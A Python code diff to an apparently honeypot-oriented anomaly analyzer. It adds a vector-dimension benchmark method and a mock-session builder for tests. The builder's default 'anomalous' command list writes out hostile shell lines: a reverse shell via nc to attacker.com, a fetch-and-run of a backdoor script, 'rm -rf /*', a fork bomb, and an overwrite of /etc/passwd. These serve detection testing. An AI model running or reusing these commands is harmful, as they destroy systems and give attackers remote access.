@@ -3,12 +3,14 @@
 from __future__ import annotations
 
 import hashlib
+import json
 import logging
 import pickle
 import resource
 import time
 from collections import defaultdict
 from dataclasses import dataclass, field
+from datetime import UTC, datetime, timedelta
 from pathlib import Path
 from typing import Any, Dict, List, Optional, Tuple
 
@@ -293,7 +295,196 @@ class LongtailAnalyzer:
         )
 
         return result
-    
+
+    def benchmark_vector_dimensions(
+        self,
+        test_sessions: List[SessionSummary],
+        dimensions_to_test: List[int] = None
+    ) -> Dict[int, Dict[str, float]]:
+        """Benchmark different vector dimensions for optimal performance.
+
+        Args:
+            test_sessions: Sessions to use for benchmarking
+            dimensions_to_test: List of dimensions to test (default: [32, 64, 128, 256])
+
+        Returns:
+            Dictionary mapping dimension to performance metrics
+        """
+        if dimensions_to_test is None:
+            dimensions_to_test = [32, 64, 128, 256]
+
+        results = {}
+
+        logger.info(f"Benchmarking vector dimensions: {dimensions_to_test}")
+
+        for dim in dimensions_to_test:
+            logger.info(f"Testing dimension: {dim}")
+
+            # Create analyzer with specific dimension
+            test_analyzer = LongtailAnalyzer(
+                self.session_factory,
+                vocab_path=self.command_vectorizer.vocab_path,  # Reuse vocabulary path
+                rarity_threshold=self.rarity_threshold,
+                sequence_window=self.sequence_window,
+                cluster_eps=self.cluster_eps,
+                min_cluster_size=self.min_cluster_size,
+                entropy_threshold=self.entropy_threshold,
+                sensitivity_threshold=self.sensitivity_threshold,
+                vector_analysis_enabled=self.vector_analysis_enabled,
+            )
+
+            # Override the max_features for this test
+            test_analyzer.command_vectorizer.max_features = dim
+
+            start_time = time.perf_counter()
+
+            try:
+                # Run analysis with this dimension
+                result = test_analyzer.analyze(test_sessions, lookback_days=30)
+
+                duration = time.perf_counter() - start_time
+
+                # Calculate quality metrics
+                silhouette = result.statistical_summary.get("avg_silhouette_score", 0.0)
+                detection_rate = (
+                    result.rare_command_count + result.anomalous_sequence_count
+                ) / max(result.total_sessions_analyzed, 1)
+
+                results[dim] = {
+                    "duration": duration,
+                    "memory_mb": result.memory_usage_mb,
+                    "quality_score": silhouette,
+                    "detection_rate": detection_rate,
+                    "efficiency": (1000 / duration) * silhouette if duration > 0 else 0,  # Combined metric
+                }
+
+                logger.info(
+                    f"Dimension {dim}: duration={duration:.2f}s, "
+                    f"memory={result.memory_usage_mb:.1f}MB, "
+                    f"quality={silhouette:.3f}, "
+                    f"efficiency={results[dim]['efficiency']:.2f}"
+                )
+
+            except Exception as e:
+                logger.error(f"Error benchmarking dimension {dim}: {e}")
+                results[dim] = {
+                    "duration": float('inf'),
+                    "memory_mb": float('inf'),
+                    "quality_score": 0.0,
+                    "detection_rate": 0.0,
+                    "efficiency": 0.0,
+                }
+
+        # Recommend optimal dimension
+        if results:
+            optimal = max(results.items(), key=lambda x: x[1]["efficiency"])
+            logger.info(f"Optimal dimension: {optimal[0]} (efficiency: {optimal[1]['efficiency']:.2f})")
+
+        return results
+
+    @staticmethod
+    def create_mock_sessions_with_commands(
+        normal_sequence: List[str] = None,
+        anomalous_sequence: List[str] = None,
+        num_normal_sessions: int = 10,
+        num_anomalous_sessions: int = 3
+    ) -> List[SessionSummary]:
+        """Create mock sessions with realistic command patterns for testing.
+
+        Args:
+            normal_sequence: List of normal commands (default: common Linux commands)
+            anomalous_sequence: List of anomalous commands (default: suspicious commands)
+            num_normal_sessions: Number of normal sessions to create
+            num_anomalous_sessions: Number of anomalous sessions to create
+
+        Returns:
+            List of SessionSummary objects with realistic command data
+        """
+        if normal_sequence is None:
+            normal_sequence = [
+                "ls", "cd /tmp", "wget http://example.com/file", "chmod +x file", "./file",
+                "cat /etc/passwd", "whoami", "uname -a", "ps aux", "df -h"
+            ]
+
+        if anomalous_sequence is None:
+            anomalous_sequence = [
+                "echo 'evil' > /etc/passwd",
+                "rm -rf /*",
+                ":(){ :|:& };:",  # Fork bomb
+                "nc -e /bin/sh attacker.com 4444",
+                "wget http://malicious.com/backdoor.sh && chmod +x backdoor.sh && ./backdoor.sh"
+            ]
+
+        sessions = []
+
+        # Create normal sessions
+        for i in range(num_normal_sessions):
+            session_id = f"normal_session_{i:03d}"
+
+            # Create realistic session with commands
+            commands = []
+            for j, cmd in enumerate(normal_sequence):
+                commands.append({
+                    "input": cmd,
+                    "timestamp": (datetime.now(UTC) - timedelta(minutes=j*2)).isoformat()
+                })
+
+            # Create session summary (simplified for testing)
+            session = SessionSummary(
+                session_id=session_id,
+                first_event_at=datetime.now(UTC) - timedelta(hours=1),
+                last_event_at=datetime.now(UTC),
+                event_count=len(commands),
+                command_count=len(commands),
+                file_downloads=1 if "wget" in " ".join(normal_sequence) else 0,
+                login_attempts=1,
+                vt_flagged=False,
+                dshield_flagged=False,
+                risk_score=10,
+                matcher="test_matcher"
+            )
+
+            # Store commands as JSON for testing (normally this would be in database)
+            session.__dict__['commands'] = json.dumps(commands)
+            sessions.append(session)
+
+        # Create anomalous sessions
+        for i in range(num_anomalous_sessions):
+            session_id = f"anomalous_session_{i:03d}"
+
+            # Create anomalous session with suspicious commands
+            commands = []
+            for j, cmd in enumerate(anomalous_sequence):
+                commands.append({
+                    "input": cmd,
+                    "timestamp": (datetime.now(UTC) - timedelta(minutes=j*1)).isoformat()
+                })
+
+            # Create session summary
+            session = SessionSummary(
+                session_id=session_id,
+                first_event_at=datetime.now(UTC) - timedelta(hours=1),
+                last_event_at=datetime.now(UTC),
+                event_count=len(commands),
+                command_count=len(commands),
+                file_downloads=2,  # More downloads for suspicious sessions
+                login_attempts=3,  # More login attempts
+                vt_flagged=True,
+                dshield_flagged=True,
+                risk_score=90,
+                matcher="test_matcher"
+            )
+
+            # Store commands as JSON for testing
+            session.__dict__['commands'] = json.dumps(commands)
+            sessions.append(session)
+
+        logger.info(
+            f"Created {len(sessions)} mock sessions "
+            f"({num_normal_sessions} normal, {num_anomalous_sessions} anomalous)"
+        )
+        return sessions
+
     def _calculate_session_duration(self, session: SessionSummary) -> float:
         """Calculate session duration in seconds.
         
